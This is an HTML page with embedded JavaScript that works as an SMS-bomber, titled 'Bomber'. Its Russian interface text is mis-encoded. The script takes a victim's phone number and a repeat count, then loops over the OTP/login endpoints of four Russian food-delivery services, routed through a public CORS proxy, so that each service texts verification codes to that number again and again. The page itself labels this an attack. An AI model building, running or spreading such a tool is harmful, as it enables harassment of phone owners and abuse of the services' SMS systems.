<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
    <title>Bomber ¬∑ –ª—É–Ω–∞ ‚Äî LOCAL EDITION</title>
    <style>
        :root {
            --accent: #b0b0ff; 
            --bg-glow: radial-gradient(circle at 30% 20%, #1e1e2f, #0a0c14);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body {
            background: var(--bg-glow);
            color: #eaeaff;
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        .card { width: 100%; max-width: 320px; text-align: center; position: relative; z-index: 10; }
        .header { display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; gap: 8px; }
        .title { font-size: 2.2rem; font-weight: 700; text-shadow: 0 0 10px var(--accent); }
        .row { display: flex; justify-content: center; gap: 6px; margin-bottom: 1.5rem; }
        .phone-field {
            display: flex; align-items: center; background: rgba(18, 18, 30, 0.8);
            border: 1px solid #5f5f8f; border-radius: 14px; width: 200px; padding: 5px;
        }
        .phone-number-input { background: transparent; border: none; color: #fff; outline: none; width: 100%; font-family: monospace; }
        .repeats { background: rgba(20, 20, 35, 0.7); border: 1px solid #5f5f8f; border-radius: 12px; padding: 5px 10px; display: flex; align-items: center; }
        .repeats-input { width: 40px; background: transparent; border: none; color: #fff; text-align: center; outline: none; font-weight: bold; }
        .attack-btn {
            width: 100%; background: rgba(255, 255, 255, 0.08); border: 1px solid var(--accent);
            border-radius: 100px; color: #fff; padding: 15px; cursor: pointer; font-weight: bold; transition: 0.3s;
        }
        .attack-btn:hover { background: rgba(176, 176, 255, 0.2); }
        .loading-overlay {
            position: fixed; inset: 0; background: rgba(10, 10, 20, 0.95);
            display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 5000;
        }
        .loading-overlay.show { display: flex; }
        .progress-bg { width: 250px; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; margin-top: 20px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: var(--accent); transition: 0.4s; }
        .cors-notice { font-size: 0.7rem; color: #ffb0b0; margin-top: 10px; max-width: 280px; }
    </style>
</head>
<body>

<canvas id="bg-canvas"></canvas>

<div class="card">
    <div class="header">
        <span class="title">Crux</span>
        <span style="font-size: 2rem;">üöÄ</span>
    </div>
    
    <div class="row">
        <div class="phone-field">
            <span style="padding: 0 5px; opacity: 0.7;">+</span>
            <input class="phone-number-input" type="text" id="phone" placeholder="79991234567" inputmode="numeric">
        </div>
        <div class="repeats">
            <input class="repeats-input" type="number" id="repeat" value="3">
        </div>
    </div>
    
    <button class="attack-btn" id="go">–ó–ê–ü–£–°–¢–ò–¢–¨ –° –ú–û–ï–ì–û IP</button>
    <div class="cors-notice">–í–Ω–∏–º–∞–Ω–∏–µ: –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤–∞—à –ª–æ–∫–∞–ª—å–Ω—ã–π IP –∞–¥—Ä–µ—Å.</div>
</div>

<div class="loading-overlay" id="loadingOverlay">
    <div id="statusTxt" style="letter-spacing: 2px;">–ü–û–î–ì–û–¢–û–í–ö–ê...</div>
    <div class="progress-bg"><div class="progress-fill" id="progressFill"></div></div>
    <button id="stopAttack" style="margin-top:30px; background:none; border:1px solid #ff4444; color:#ff4444; padding:10px 25px; border-radius:20px; cursor:pointer;">–û–¢–ú–ï–ù–ê</button>
</div>

<script>
    let isAttacking = false;

    // –°–ø–∏—Å–æ–∫ —Å–µ—Ä–≤–∏—Å–æ–≤ —Å –∞–¥–∞–ø—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏
    const services = [
        { name: "M-Food", url: "https://spb.m-food.ru/local/components/mfood/auth/ajax.php", method: "POST", body: (p) => `action=send_code&phone=${p}`, type: "application/x-www-form-urlencoded" },
        { name: "Allo Pizza", url: "https://allopizza.su/api/v1/auth/otp", method: "POST", body: (p) => JSON.stringify({ phone: p }), type: "application/json" },
        { name: "GrowFood", url: "https://growfood.pro/api/v1/auth/login", method: "POST", body: (p) => JSON.stringify({ phone: p }), type: "application/json" },
        { name: "LetBeFit", url: "https://spb.letbefit.ru/ajax/auth.php", method: "POST", body: (p) => `action=send_sms&phone=${p}`, type: "application/x-www-form-urlencoded" }
    ];

    async function startAttack() {
        const phone = document.getElementById('phone').value.replace(/\D/g, '');
        const reps = parseInt(document.getElementById('repeat').value) || 1;
        const progress = document.getElementById('progressFill');
        const statusTxt = document.getElementById('statusTxt');

        if (phone.length < 10) return alert("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä");

        document.getElementById('loadingOverlay').classList.add('show');
        isAttacking = true;

        // –ò—Å–ø–æ–ª—å–∑—É–µ–º –ø—Ä–æ–∫—Å–∏ –¥–ª—è –æ–±—Ö–æ–¥–∞ CORS
        const proxy = "https://corsproxy.io/?"; 

        for (let i = 0; i < reps; i++) {
            if (!isAttacking) break;
            
            statusTxt.innerText = `–ö–†–£–ì ${i + 1} –ò–ó ${reps}`;
            
            for (const srv of services) {
                if (!isAttacking) break;
                try {
                    await fetch(proxy + srv.url, {
                        method: srv.method,
                        headers: { 'Content-Type': srv.type },
                        body: srv.body(phone)
                    });
                    console.log(`‚úÖ ${srv.name} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω`);
                } catch (e) {
                    console.log(`‚ùå –û—à–∏–±–∫–∞ –Ω–∞ ${srv.name}`);
                }
                // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É —Å–µ—Ä–≤–∏—Å–∞–º–∏, —á—Ç–æ–±—ã –±—Ä–∞—É–∑–µ—Ä –Ω–µ –∑–∞–≤–∏—Å
                await new Promise(r => setTimeout(r, 500));
            }
            
            progress.style.width = ((i + 1) / reps * 100) + "%";
            await new Promise(r => setTimeout(r, 2000));
        }

        statusTxt.innerText = "–ê–¢–ê–ö–ê –ó–ê–í–ï–†–®–ï–ù–ê";
        setTimeout(() => {
            document.getElementById('loadingOverlay').classList.remove('show');
            progress.style.width = "0%";
        }, 2000);
    }

    document.getElementById('go').onclick = startAttack;
    document.getElementById('stopAttack').onclick = () => { isAttacking = false; };

    // –ü—Ä–æ—Å—Ç–∞—è –∞–Ω–∏–º–∞—Ü–∏—è —Ñ–æ–Ω–∞
    const canvas = document.getElementById('bg-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    function draw() {
        ctx.fillStyle = "rgba(10, 12, 20, 0.2)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#b0b0ff";
        for(let i=0; i<30; i++) {
            ctx.beginPath();
            ctx.arc(Math.random()*canvas.width, Math.random()*canvas.height, 1, 0, Math.PI*2);
            ctx.fill();
        }
        requestAnimationFrame(draw);
    }
    draw();
</script>

</body>
</html>
